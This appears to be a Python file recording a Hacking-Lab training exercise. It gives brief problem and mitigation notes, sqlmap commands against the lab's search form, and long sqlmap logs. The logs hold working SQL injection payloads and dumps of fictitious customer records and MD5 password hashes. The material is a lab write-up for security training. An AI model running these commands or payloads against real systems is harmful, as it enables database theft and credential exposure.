__problem__ = \
"""
Server doesn't use prepared statements. Passwords aren't hashed.
"""

__attack__ = \
"""
SQL injection with sqlmap.
"""

__mitigation__ = \
"""
Use prepared statement. Hash properly bith BCrypt, use OAuth.
"""



__commands__ = [
    """
    sqlmap -u http://glocken.hacking-lab.com/12001/inputval_case3/inputval3/controller\?words\=test\&send\=suchen\&action\=search --tables --hex --threads 4
    """,
    """
    sqlmap -u http://glocken.hacking-lab.com/12001/inputval_case3/inputval3/controller\?words\=test\&send\=suchen\&action\=search -D glocken_emil -T customers --dump
    """,
    """
    sqlmap -u http://glocken.hacking-lab.com/12001/inputval_case3/inputval3/controller\?words\=test\&send\=suchen\&action\=search -D elgg -T elgg_users --dump
    """
]

___logs__ = [
    """
    sqlmap identified the following injection point(s) with a total of 303 HTTP(s) requests:
---
Parameter: words (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: words=-2428') OR 5669=5669#&send=suchen&action=search

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: words=test') OR ROW(8040,3516)>(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (ELT(8040=8040,1))),0x71716b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 5492 UNION SELECT 4935 UNION SELECT 3379 UNION SELECT 3744)a GROUP BY x)-- hYkj&send=suchen&action=search

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: words=test') OR SLEEP(5)-- TGJL&send=suchen&action=search
---
back-end DBMS: MySQL >= 4.1
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: words (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: words=-2428') OR 5669=5669#&send=suchen&action=search

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: words=test') OR ROW(8040,3516)>(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (ELT(8040=8040,1))),0x71716b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 5492 UNION SELECT 4935 UNION SELECT 3379 UNION SELECT 3744)a GROUP BY x)-- hYkj&send=suchen&action=search

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: words=test') OR SLEEP(5)-- TGJL&send=suchen&action=search
---
back-end DBMS: MySQL >= 4.1
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: words (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: words=-2428') OR 5669=5669#&send=suchen&action=search

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: words=test') OR ROW(8040,3516)>(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (ELT(8040=8040,1))),0x71716b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 5492 UNION SELECT 4935 UNION SELECT 3379 UNION SELECT 3744)a GROUP BY x)-- hYkj&send=suchen&action=search

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: words=test') OR SLEEP(5)-- TGJL&send=suchen&action=search
---
back-end DBMS: MySQL >= 4.1
Database: elgg
[9 tables]
+------------------------+
| None                   |
| elgg_comments          |
| elgg_commentwall       |
| elgg_content_flags     |
| elgg_profile_data      |
| elgg_template_elements |
| elgg_weblog_watchlist  |
| elgg_widget_data       |
| elgg_widgets           |
+------------------------+

Database: creditcompany
[1 table]
+------------------------+
| transactions           |
+------------------------+

Database: glocken_emil
[7 tables]
+------------------------+
| None                   |
| authorisation          |
| cart                   |
| orders                 |
| products_de            |
| products_en            |
| searchhistory          |
+------------------------+

Current database
[13 tables]
+------------------------+
| None                   |
| columns_priv           |
| customers              |
| elgg_datalists         |
| elgg_pages             |
| elgg_users             |
| elgg_weblog_comments   |
| help_category          |
| help_relation          |
| inspectorCart          |
| orderpositions         |
| rights                 |
| time_zone              |
+------------------------+

Database: mysql
[4 tables]
+------------------------+
| None                   |
| host                   |
| time_zone_name         |
| time_zone_transition   |
+------------------------+

Database: login
[1 table]
+------------------------+
| None                   |
+------------------------+

sqlmap resumed the following injection point(s) from stored session:
---
Parameter: words (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: words=-2428') OR 5669=5669#&send=suchen&action=search

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: words=test') OR ROW(8040,3516)>(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (ELT(8040=8040,1))),0x71716b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 5492 UNION SELECT 4935 UNION SELECT 3379 UNION SELECT 3744)a GROUP BY x)-- hYkj&send=suchen&action=search

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: words=test') OR SLEEP(5)-- TGJL&send=suchen&action=search
---
back-end DBMS: MySQL >= 4.1
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: words (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: words=-2428') OR 5669=5669#&send=suchen&action=search

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: words=test') OR ROW(8040,3516)>(SELECT COUNT(*),CONCAT(0x7162767171,(SELECT (ELT(8040=8040,1))),0x71716b7a71,FLOOR(RAND(0)*2))x FROM (SELECT 5492 UNION SELECT 4935 UNION SELECT 3379 UNION SELECT 3744)a GROUP BY x)-- hYkj&send=suchen&action=search

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: words=test') OR SLEEP(5)-- TGJL&send=suchen&action=search
---
back-end DBMS: MySQL >= 4.1
    """,
    """
    sqlmap -u http://glocken.hacking-lab.com/12001/inputval_case3/inputval3/controller\?words\=test\&send\=suchen\&action\=search -D glocken_emil -T customers --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.2.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:05:49

[13:05:59] [INFO] testing connection to the target URL
[13:06:00] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[13:06:00] [INFO] testing if the target URL content is stable
[13:06:01] [INFO] target URL content is stable
[13:06:01] [INFO] testing if GET parameter 'words' is dynamic
[13:06:01] [WARNING] GET parameter 'words' does not appear to be dynamic
[13:06:02] [INFO] heuristic (basic) test shows that GET parameter 'words' might be injectable (possible DBMS: 'MySQL')
[13:06:02] [INFO] heuristic (XSS) test shows that GET parameter 'words' might be vulnerable to cross-site scripting (XSS) attacks
[13:06:02] [INFO] testing for SQL injection on GET parameter 'words'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] n
[13:06:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:06:10] [WARNING] reflective value(s) found and filtering out
[13:06:12] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
[13:06:12] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:06:15] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:06:15] [INFO] testing 'MySQL inline queries'
[13:06:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[13:06:15] [WARNING] time-based comparison requires larger statistical model, please wait..... (done)                                                                                                       
[13:06:19] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[13:06:20] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[13:06:20] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:06:21] [INFO] target URL appears to have 5 columns in query
[13:06:21] [INFO] GET parameter 'words' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[13:06:21] [INFO] checking if the injection point on GET parameter 'words' is a false positive
GET parameter 'words' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: words (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: words=test') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178787071,0x6145635273464c75466b51534d4d526d43544a556d6e4e526449444b416d4d56507750725945586b,0x716b627671),NULL-- cnIy&send=suchen&action=search
---
[13:07:17] [INFO] testing MySQL
[13:07:17] [INFO] confirming MySQL
[13:07:17] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0
[13:07:17] [INFO] fetching columns for table 'customers' in database 'glocken_emil'
[13:07:19] [INFO] fetching entries for table 'customers' in database 'glocken_emil'
Database: glocken_emil
Table: customers
[44 entries]
+------------+------+-----------+------------------+-------------+------------------+--------------+-----------+----------+-------------+---------------------+
| customerid | plz  | name      | email            | mobile      | street           | surname      | country   | username | location    | creditcard          |
+------------+------+-----------+------------------+-------------+------------------+--------------+-----------+----------+-------------+---------------------+
| 1          | 2345 | Fritz     | hacker10@hack.er | 07399888999 | 1th Network Rd   | Mueller      | Routania  | hacker10 | Switchoming | 1323-4545-6767-8989 |
| 2          | 2345 | Ruedi     | hacker11@hack.er | 07399888999 | 1th Network Rd   | Meier        | Routania  | hacker11 | Switchoming | 2323-4545-6760-8989 |
| 3          | 2345 | Sabine    | hacker12@hack.er | 07399888999 | 1th Network Rd   | Schmidt      | Routania  | hacker12 | Switchoming | 2322-4545-6767-8989 |
| 4          | 2345 | Yolanda   | hacker13@hack.er | 07399888999 | 1th Network Rd   | Sprenger     | Routania  | hacker13 | Switchoming | 3323-4544-6767-8989 |
| 5          | 2345 | Woodstock | hacker14@hack.er | 07399888999 | 1th Network Rd   | Monsch       | Routania  | hacker14 | Switchoming | 2323-4545-6767-8989 |
| 6          | 2345 | Adrian    | hacker15@hack.er | 07399888999 | 1th Network Rd   | Peter        | Routania  | hacker15 | Switchoming | 2323-4545-6447-8989 |
| 7          | 2345 | Daniel    | hacker16@hack.er | 07399888999 | 1th Network Rd   | Leuenberger  | Routania  | hacker16 | Switchoming | 6523-4545-6767-8989 |
| 8          | 2345 | Markus    | hacker17@hack.er | 07399888999 | 1th Network Rd   | Wildberger   | Routania  | hacker17 | Switchoming | 2343-4545-6767-8989 |
| 9          | 2345 | Michael   | hacker18@hack.er | 07399888999 | 1th Network Rd   | Eggenberger  | Routania  | hacker18 | Switchoming | 2323-4545-6567-8989 |
| 10         | 2345 | Nicole    | hacker19@hack.er | 07399888999 | 1th Network Rd   | Gn?gi        | Routania  | hacker19 | Switchoming | 2323-4545-6767-8939 |
| 11         | 2345 | Heinrich  | hacker20@hack.er | 07399888999 | 1th Network Rd   | Putignano    | Routania  | hacker20 | Switchoming | 2323-4545-6767-8009 |
| 12         | 2345 | Franz     | hacker21@hack.er | 07399888999 | 1th Network Rd   | Feinstein    | Routania  | hacker21 | Switchoming | 2325-4545-6767-8919 |
| 13         | 2345 | Heinz     | hacker22@hack.er | 07399888999 | 1th Network Rd   | Bush         | Routania  | hacker22 | Switchoming | 2323-4545-6757-8989 |
| 14         | 2345 | Dieter    | hacker23@hack.er | 07399888999 | 1th Network Rd   | Clinton      | Routania  | hacker23 | Switchoming | 2323-6565-6767-8989 |
| 15         | 2345 | Cyrill    | hacker24@hack.er | 07399888999 | 1th Network Rd   | Kunz         | Routania  | hacker24 | Switchoming | 2323-5745-6767-8989 |
| 16         | 2345 | Oskar     | hacker25@hack.er | 07399888999 | 1th Network Rd   | Kohl         | Routania  | hacker25 | Switchoming | 2323-2345-6767-8989 |
| 17         | 2345 | Robert    | hacker26@hack.er | 07399888999 | 1th Network Rd   | Koller       | Routania  | hacker26 | Switchoming | 2323-4635-6767-8989 |
| 18         | 2345 | Rene      | hacker27@hack.er | 07399888999 | 1th Network Rd   | Meyer        | Routania  | hacker27 | Switchoming | 2323-4567-6767-8989 |
| 19         | 2345 | Michael   | hacker28@hack.er | 07399888999 | 1th Network Rd   | Svennson     | Routania  | hacker28 | Switchoming | 2323-4645-9997-8989 |
| 20         | 2345 | Karl      | hacker29@hack.er | 07399888999 | 1th Network Rd   | Matter       | Routania  | hacker29 | Switchoming | 2323-4545-6767-6689 |
| 21         | 2345 | Franziska | hacker30@hack.er | 07399888999 | 1th Network Rd   | Knobel       | Routania  | hacker30 | Switchoming | 2323-5677-6767-8989 |
| 22         | 2345 | Eduard    | hacker31@hack.er | 07399888999 | 1th Network Rd   | Habluetzel   | Routania  | hacker31 | Switchoming | 2325-4545-6767-3535 |
| 23         | 2345 | Joris     | hacker32@hack.er | 07399888999 | 1th Network Rd   | Kuenzi       | Routania  | hacker32 | Switchoming | 2323-4545-2354-8989 |
| 24         | 2345 | Karl      | hacker33@hack.er | 07399888999 | 1th Network Rd   | Klammer      | Routania  | hacker33 | Switchoming | 2323-7685-6767-8989 |
| 25         | 2345 | Corinne   | hacker34@hack.er | 07399888999 | 1th Network Rd   | Oberholzer   | Routania  | hacker34 | Switchoming | 2323-5745-2345-8989 |
| 26         | 2345 | Anton     | hacker35@hack.er | 07399888999 | 1th Network Rd   | Buehler      | Routania  | hacker35 | Switchoming | 2456-2345-6767-8989 |
| 27         | 2345 | Alfredo   | hacker36@hack.er | 07399888999 | 1th Network Rd   | Rosario      | Routania  | hacker36 | Switchoming | 2323-4635-6767-4566 |
| 28         | 2345 | Steven    | hacker37@hack.er | 07399888999 | 1th Network Rd   | Sonderegger  | Routania  | hacker37 | Switchoming | 1233-4567-6767-8989 |
| 29         | 2345 | Maria     | hacker38@hack.er | 07399888999 | 1th Network Rd   | Meister      | Routania  | hacker38 | Switchoming | 2323-4645-9997-8989 |
| 30         | 2345 | Sepp      | hacker39@hack.er | 07399888999 | 1th Network Rd   | Berger       | Routania  | hacker39 | Switchoming | 4676-4545-6767-6689 |
| 31         | 2345 | Klaus     | hacker40@hack.er | 07399888999 | 1th Network Rd   | Widmer       | Routania  | hacker40 | Switchoming | 2323-7977-6767-8989 |
| 32         | 2345 | Sandro    | hacker41@hack.er | 07399888999 | 1th Network Rd   | Imhof        | Routania  | hacker41 | Switchoming | 2325-4545-6767-3535 |
| 33         | 2345 | Joerg     | hacker42@hack.er | 07399888999 | 1th Network Rd   | Moser        | Routania  | hacker42 | Switchoming | 2323-4545-2354-8989 |
| 34         | 2345 | Antonino  | hacker43@hack.er | 07399888999 | 1th Network Rd   | Lustenberger | Routania  | hacker43 | Switchoming | 2323-7685-6767-8989 |
| 35         | 2345 | Klaus     | hacker44@hack.er | 07399888999 | 1th Network Rd   | Kuster       | Routania  | hacker44 | Switchoming | 2323-5745-2345-8989 |
| 36         | 2345 | Sandra    | hacker45@hack.er | 0725445588  | 1th Network Rd   | Fischer      | Routania  | hacker45 | Switchoming | 2456-2345-6767-8989 |
| 37         | 2345 | Josef     | hacker46@hack.er | 07399888999 | 1th Network Rd   | Breitenmoser | Routania  | hacker46 | Switchoming | 2323-4635-6767-4566 |
| 38         | 2345 | Lukas     | hacker47@hack.er | 07399888999 | 1th Network Rd   | Kramer       | Routania  | hacker47 | Switchoming | 1233-4567-6767-8989 |
| 39         | 2345 | Antonio   | hacker48@hack.er | 07399888999 | 1th Network Rd   | Blaser       | Routania  | hacker48 | Switchoming | 2323-4645-9997-8989 |
| 40         | 2345 | Koebi     | hacker49@hack.er | 07399888999 | 1th Network Rd   | Braem        | Routania  | hacker49 | Switchoming | 4676-4545-6767-6689 |
| 41         | 2345 | Eduardo   | hacker50@hack.er | 07399888999 | 1th Network Rd   | Ramazotti    | Routania  | hacker50 | Switchoming | 2323-7977-6767-8989 |
| 42         | 2235 | Moritz    | root@hack.er     | 07399888999 | 27th Network Rd  | Felder       | Hackania  | root     | Wolfingen   | 1323-6785-6767-8989 |
| 43         | 2468 | Hansruedi | admin@hack.er    | 07399888999 | 127th Network Rd | Meyer        | Securania | admin    | Arpingen    | 2323-1010-6760-8989 |
| 44         | 8645 | Sandra    | sandra@hack.er   | 07699458777 | Werkstrasse 20   | Trombini     | Securania | sandy    | Jona        | 2323-1010-6760-0707 |
+------------+------+-----------+------------------+-------------+------------------+--------------+-----------+----------+-------------+---------------------+

[13:07:19] [INFO] table 'glocken_emil.customers' dumped to CSV file '/home/long/.sqlmap/output/glocken.hacking-lab.com/dump/glocken_emil/customers.csv'
[13:07:19] [INFO] fetched data logged to text files under '/home/long/.sqlmap/output/glocken.hacking-lab.com'

[*] shutting down at 13:07:19
    """,
    """
            ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.4#stable}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:13:17

[13:13:17] [INFO] resuming back-end DBMS 'mysql' 
[13:13:26] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: words (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: words=test') UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178787071,0x6145635273464c75466b51534d4d526d43544a556d6e4e526449444b416d4d56507750725945586b,0x716b627671),NULL-- cnIy&send=suchen&action=search
---
[13:13:26] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL 5
[13:13:26] [INFO] fetching columns for table 'elgg_users' in database 'elgg'
[13:13:26] [INFO] fetching entries for table 'elgg_users' in database 'elgg'
[13:13:26] [INFO] recognized possible password hashes in columns 'code, password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
do you want to crack them via a dictionary-based attack? [Y/n/q] n
Database: elgg
Table: elgg_users
[33 entries]
+-------+-------------+----------------------------------+----------------+------+-------+---------+------------------+--------+----------+----------------------------------+-----------+------------+------------+------------+-------------+------------------+
| ident | template_id | code                             | name           | icon | owner | alias   | email            | active | username | password                         | user_type | file_quota | moderation | icon_quota | last_action | template_name    |
+-------+-------------+----------------------------------+----------------+------+-------+---------+------------------+--------+----------+----------------------------------+-----------+------------+------------+------------+-------------+------------------+
| 1     | -1          | <blank>                          | News           | 2    | -1    | <blank> | all@hack.er      | yes    | news     | f15b28abd6eb54f235c0d56cf18e9371 | person    | 10000000   | no         | 10         | 1203584750  | Default_Template |
| 2     | -1          | 7e9b5154477266da8886e635889c20cd | hacker10       | 3    | -1    | <blank> | hacker10@hack.er | yes    | hacker10 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1204288718  | Default_Template |
| 3     | -1          | <blank>                          | hacker11       | 4    | -1    | <blank> | bb@bb.bb         | yes    | hacker11 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203584888  | Default_Template |
| 4     | -1          | <blank>                          | hacker12       | 5    | -1    | <blank> | cc@cc.cc         | yes    | hacker12 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203584923  | Default_Template |
| 5     | -1          | <blank>                          | Glockenfreunde | -1   | 1     | <blank> | <blank>          | yes    | glocken  | <blank>                          | community | 10000000   | no         | 10         | 0           | Default_Template |
| 10    | -1          | <blank>                          | hacker20       | 13   | -1    | <blank> | hacker20@hack.er | yes    | hacker20 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 10000000   | no         | 10         | 1203596444  | Default_Template |
| 13    | -1          | <blank>                          | hacker13       | 6    | -1    | <blank> | hacker13@hack.er | yes    | hacker13 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203584984  | Default_Template |
| 14    | -1          | <blank>                          | hacker14       | 7    | -1    | <blank> | hacker14@hack.er | yes    | hacker14 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585008  | Default_Template |
| 15    | -1          | <blank>                          | hacker15       | 8    | -1    | <blank> | hacker15@hack.er | yes    | hacker15 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585069  | Default_Template |
| 16    | -1          | <blank>                          | hacker16       | 9    | -1    | <blank> | hacker16@hack.er | yes    | hacker16 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585131  | Default_Template |
| 17    | -1          | <blank>                          | hacker17       | 10   | -1    | <blank> | hacker17@hack.er | yes    | hacker17 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585148  | Default_Template |
| 18    | -1          | <blank>                          | hacker18       | 11   | -1    | <blank> | hacker18@hack.er | yes    | hacker18 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585215  | Default_Template |
| 19    | -1          | <blank>                          | hacker19       | 12   | -1    | <blank> | hacker19@hack.er | yes    | hacker19 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585290  | Default_Template |
| 21    | -1          | <blank>                          | hacker21       | 14   | -1    | <blank> | hacker21@hack.er | yes    | hacker21 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585395  | Default_Template |
| 22    | -1          | 6065f6de6fdac8f32cd685a9a6a74dd9 | hacker22       | 33   | -1    | <blank> | hacker22@hack.er | yes    | hacker22 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1317982415  | Default_Template |
| 23    | -1          | <blank>                          | hacker23       | 16   | -1    | <blank> | hacker23@hack.er | yes    | hacker23 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585500  | Default_Template |
| 24    | -1          | <blank>                          | hacker24       | 17   | -1    | <blank> | hacker24@hack.er | yes    | hacker24 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585700  | Default_Template |
| 25    | -1          | <blank>                          | hacker25       | 18   | -1    | <blank> | hacker25@hack.er | yes    | hacker25 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585767  | Default_Template |
| 41    | -1          | <blank>                          | hacker26       | 19   | -1    | <blank> | hacker26@hack.er | yes    | hacker26 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585811  | Default_Template |
| 42    | -1          | <blank>                          | hacker27       | 1    | -1    | <blank> | hacker27@hack.er | yes    | hacker27 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585827  | Default_Template |
| 43    | -1          | <blank>                          | hacker28       | 20   | -1    | <blank> | hacker28@hack.er | yes    | hacker28 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203585976  | Default_Template |
| 44    | -1          | <blank>                          | hacker29       | 21   | -1    | <blank> | hacker29@hack.er | yes    | hacker29 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586056  | Default_Template |
| 45    | -1          | <blank>                          | hacker30       | 22   | -1    | <blank> | hacker30@hack.er | yes    | hacker30 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586108  | Default_Template |
| 46    | -1          | <blank>                          | hacker31       | 23   | -1    | <blank> | hacker31@hack.er | yes    | hacker31 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586204  | Default_Template |
| 47    | -1          | <blank>                          | hacker32       | 24   | -1    | <blank> | hacker32@hack.er | yes    | hacker32 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586274  | Default_Template |
| 48    | -1          | <blank>                          | hacker33       | 25   | -1    | <blank> | hacker33@hack.er | yes    | hacker33 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586322  | Default_Template |
| 49    | -1          | <blank>                          | hacker34       | 26   | -1    | <blank> | hacker34@hack.er | yes    | hacker34 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586362  | Default_Template |
| 50    | -1          | <blank>                          | hacker35       | 27   | -1    | <blank> | hacker35@hack.er | yes    | hacker35 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586400  | Default_Template |
| 51    | -1          | <blank>                          | hacker36       | 28   | -1    | <blank> | hacker36@hack.er | yes    | hacker36 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586857  | Default_Template |
| 52    | -1          | <blank>                          | hacker37       | 29   | -1    | <blank> | hacker37@hack.er | yes    | hacker37 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203586905  | Default_Template |
| 53    | -1          | <blank>                          | hacker38       | 30   | -1    | <blank> | hacker38@hack.er | yes    | hacker38 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203587016  | Default_Template |
| 54    | -1          | <blank>                          | hacker39       | 31   | -1    | <blank> | hacker39@hack.er | yes    | hacker39 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203587122  | Default_Template |
| 55    | -1          | <blank>                          | hacker40       | 32   | -1    | <blank> | hacker40@hack.er | yes    | hacker40 | 869d7b08ed596dbaadf3e827ce9dbd88 | person    | 1000000000 | no         | 10         | 1203587192  | Default_Template |
+-------+-------------+----------------------------------+----------------+------+-------+---------+------------------+--------+----------+----------------------------------+-----------+------------+------------+------------+-------------+------------------+

[13:13:34] [INFO] table 'elgg.elgg_users' dumped to CSV file '/home/long/.sqlmap/output/glocken.hacking-lab.com/dump/elgg/elgg_users.csv'
[13:13:34] [INFO] fetched data logged to text files under '/home/long/.sqlmap/output/glocken.hacking-lab.com'

[*] shutting down at 13:13:34

    """
]
